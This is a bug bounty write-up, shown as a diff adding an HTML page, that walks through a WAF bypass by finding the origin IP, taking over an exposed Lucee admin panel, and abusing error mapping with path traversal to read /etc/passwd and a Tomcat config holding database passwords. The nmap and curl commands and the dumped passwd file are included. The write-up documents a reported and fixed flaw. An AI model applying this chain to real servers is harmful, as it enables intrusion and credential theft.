@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion</title><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">~/index</a></li><li><a href="/categories/">~/categories</a></li><li><a href="/about/">~/about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h2 id="bug-bounty---information-disclosure-through-error-message--waf-bypass-led-to-local-file-inclusion">Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion</h2>
+
+<h1 id="summary">Summary:</h1>
+<p>This is a writeup about a critical bug that me and <a href="https://hackerone.com/cela">0xcela</a> found while poking around. This bug is undisclosed due to private program so I’m going to refer the company as <strong>redacted.com</strong>
+ </p>
+
+<p>A vulnerable directory was found which led to an information disclosure through error message. After trying different types of attacks we were blocked by Incapsula WAF, so we managed to find the origin ip to further continue our research where we found different endpoints which led to the same information disclosure through error message.</p>
+
+<h1 id="exploitation">Exploitation:</h1>
+<p>While bruteforcing hidden directories and looking through waybackurls, we found a path <strong>/cfapps/</strong> which output the error as shown in the picture below.
+ 
+<img src="/assets/images/image2.png" alt="full path disclosure" class="images" /></p>
+
+<p> </p>
+
+<p>We also found some endpoints that accepted parameters but soon as we tried something suspicious we were blocked and we couldn’t access that site anymore. So we decided to look through censys.io search engine without any specific filter only “redacted.com” and we found the origin ip.</p>
+
+<p>To prove that we found the origin ip, we could compare the body and site headers.
+ </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">&gt;</span> <span class="nv">$ </span>nmap <span class="nt">-p80</span>,443 redacted.com
+80/tcp open http Incapsula CDN httpd
+443/tcp open ssl/http Incapsula CDN http
+
+<span class="o">&gt;</span> <span class="nv">$ </span>nmap <span class="nt">-p80</span>,443 <span class="nt">-sV</span> IP
+PORT STATE SERVICE VERSION
+80/tcp open http Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+443/tcp open ssl/http Apache Tomcat/Coyote JSP engine 1.1
+
+<span class="o">&gt;</span> <span class="nv">$ </span>curl https://IP/cfapps/ <span class="nt">-k</span> <span class="nt">-v</span>
+&lt;<span class="o">!</span>doctype html&gt;
+&lt;title&gt;External Apps&lt;/title&gt;
+..[SNIP]..
+&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"center padding"</span><span class="o">&gt;</span>
+<span class="o">{</span>ts <span class="s1">'2019-05-28 13:06:26'</span><span class="o">}</span>
+&lt;/div&gt;
+..[SNIP]..
+&lt;/html&gt;
+
+<span class="o">&gt;</span> <span class="nv">$ </span>curl https://redacted.com/cfapps/ <span class="nt">-v</span>
+&lt;<span class="o">!</span>doctype html&gt;
+&lt;title&gt;External Apps&lt;/title&gt;
+..[SNIP]..
+&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"center padding"</span><span class="o">&gt;</span>
+<span class="o">{</span>ts <span class="s1">'2019-05-28 13:07:53'</span><span class="o">}</span>
+&lt;/div&gt;
+..[SNIP]..
+&lt;/html&gt;</code></pre></figure>
+
+<p> </p>
+
+<p>We decided to report this because we thought that it would count as valid bug as it was exposing full paths but..
+ 
+<img src="/assets/images/image3.png" alt="h1 reply" class="images" />
+ 
+We continued our research to come up with an attack vector. We managed to log in into Lucee framework then abused Error Mapping function. What this function does is that when an error occurs, it redirects to a default error which is stored in a local file, in our case we could change it to read sensitive files.
+ 
+After knowing that it uses Lucee framework, we browsed to https://IP/lucee/
+ </p>
+
+<p>Lucee has a public admin interface by default which you can find the path on view-source of /lucee/ and is located on https://IP/lucee/lucee/admin/server.cfm
+ </p>
+
+<p>This prompts for a new password, which we set to admin321. We could log out and log in again on <strong>https://IP/lucee/lucee/admin/web.cfm</strong>. Even after we set a new password we could still change it by browsing to /server.cfm
+ 
+Browsing to /lucee/lucee/admin/web.cfm?action=server.error we could change the function when the application receives an 404 or 500 error, we changed the 500 error from default value (/lucee/templates/error/error.cfm) to <strong>../../../../../../../../../../etc/passwd.</strong>
+ 
+<img src="/assets/images/image4.png" alt="Lucee Interface" class="images" />
+ </p>
+
+<p><strong>To execute the error.cfm, we made a request on a page that returned error 500</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> GET <span class="se">\</span>
+https://IP/lucee/lucee/admin/web.cfm?action<span class="o">=</span>debugging.logs&amp;action2<span class="o">=</span>detail&amp;id<span class="o">=</span>DCF806E56E1192D43C0A8B64EC573BC6
+</code></pre></div></div>
+<p> 
+<strong>Response</strong>:
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html;charset=UTF-8</p>
+
+<blockquote>
+  <p style="color: red">root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:997:User for polkitd:/:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+<strong>raladmin:x:1000:1000::/home/raladmin:/bin/bash</strong>
+sssd:x:997:994:User for sssd:/:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+setroubleshoot:x:996:992::/var/lib/setroubleshoot:/sbin/nologin
+<strong>webuser:x:1001:1001:webuser:/home/webuser:/bin/bash</strong>
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin</p>
+</blockquote>
+
+<p> 
+<img src="/assets/images/image5.png" alt="passwd" class="images" />
+ 
+We also managed to read ../../../../../../../../../../../../usr/share/tomcat/conf/server.xml
+ 
+There was some sensitive info located in this file, including web-ldap and azure cloud postgresql passwords</p>
+
+<h1 id="note">Note:</h1>
+<ul>
+  <li>Security Team decided to rate this bug as critical</li>
+  <li>Bounty awarded</li>
+  <li>Vulnerability fixed</li>
+</ul>
+
+
+    </main><footer>
+  Theme by [b2a3e8](https://github.com/b2a3e8/)
+</footer>
+</div>
+  </body>
+</html>
